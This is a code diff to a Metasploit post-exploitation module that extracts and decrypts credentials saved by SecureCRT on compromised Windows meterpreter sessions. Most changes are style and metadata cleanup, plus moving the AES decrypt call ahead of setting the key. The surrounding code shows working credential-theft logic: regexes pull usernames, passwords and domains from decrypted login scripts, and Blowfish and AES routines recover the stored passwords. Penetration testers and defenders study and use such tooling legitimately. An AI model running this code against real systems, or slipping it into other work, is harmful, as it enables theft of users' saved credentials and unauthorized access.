@@ -27,7 +27,20 @@ class MetasploitModule < Msf::Post
           'Kali-Team <kali-team[at]qq.com>' # Metasploit module
         ],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Reliability' => [],
+          'Stability' => [ CRASH_SAFE ],
+          'SideEffects' => [ IOC_IN_LOGS ]
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_search
+              stdapi_fs_separator
+            ]
+          }
+        }
       )
     )
     register_options(
@@ -49,11 +62,11 @@ class MetasploitModule < Msf::Post
 
   def try_encode_file(data)
     if data[0].unpack('C') == [255] && data[1].unpack('C') == [254]
-      data[2..-1].force_encoding('UTF-16LE').encode('UTF-8')
+      data[2..].force_encoding('UTF-16LE').encode('UTF-8')
     elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [187] && data[2].unpack('C') == [191]
       data
     elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [255]
-      data[2..-1].force_encoding('UTF-16BE').encode('UTF-8')
+      data[2..].force_encoding('UTF-16BE').encode('UTF-8')
     else
       data
     end
@@ -83,9 +96,9 @@ class MetasploitModule < Msf::Post
       hostname = file[/"Hostname"=(?<hostname>[^\s]+)/u, 'hostname']
       decrypted_script = securecrt_crypto_v2(file[/"Login Script V3"=02:(?<script>[0-9a-f]+)/u, 'script'])
       if !decrypted_script.nil?
-        username = decrypted_script[/[l]*ogin(?: name)?:\x1F(?<login>\S+)\x1F(?:[\d])\x1F[p]*ass/u, 'login']
-        password = decrypted_script[/[p]*assword:\x1F(?<password>[\S]+)\x1F/u, 'password']
-        domain = decrypted_script[/[Ww]*indows [Dd]*omain:\x1F(?<domain>[\S]+)\x1F/u, 'domain']
+        username = decrypted_script[/l*ogin(?: name)?:\x1F(?<login>\S+)\x1F(?:\d)\x1Fp*ass/u, 'login']
+        password = decrypted_script[/p*assword:\x1F(?<password>\S+)\x1F/u, 'password']
+        domain = decrypted_script[/[Ww]*indows [Dd]*omain:\x1F(?<domain>\S+)\x1F/u, 'domain']
         if !domain.nil? && !username.nil?
           username = "#{domain}\\#{username}"
         end
@@ -119,7 +132,7 @@ class MetasploitModule < Msf::Post
     cipher_tmp = blowfish_decrypt(key1, ciphered_bytes)[4..-5]
     padded_plain_bytes = blowfish_decrypt(key2, cipher_tmp)
     (0..padded_plain_bytes.length).step(2) do |i|
-      if (padded_plain_bytes[i] == "\x00" && padded_plain_bytes[i + 1] == "\x00")
+      if padded_plain_bytes[i] == "\x00" && padded_plain_bytes[i + 1] == "\x00"
         return padded_plain_bytes[0..i - 1].force_encoding('UTF-16LE').encode('UTF-8')
       end
     end
@@ -134,9 +147,9 @@ class MetasploitModule < Msf::Post
     config_passphrase = datastore['PASSPHRASE'] || nil
     key = OpenSSL::Digest::SHA256.new(config_passphrase).digest
     aes = OpenSSL::Cipher.new('AES-256-CBC')
+    aes.decrypt
     aes.key = key
     aes.padding = 0
-    aes.decrypt
     aes.iv = iv
     padded_plain_bytes = aes.update([ciphertext].pack('H*'))
     plain_bytes_length = padded_plain_bytes[0, 4].unpack1('l') # bytes to int little-endian format.
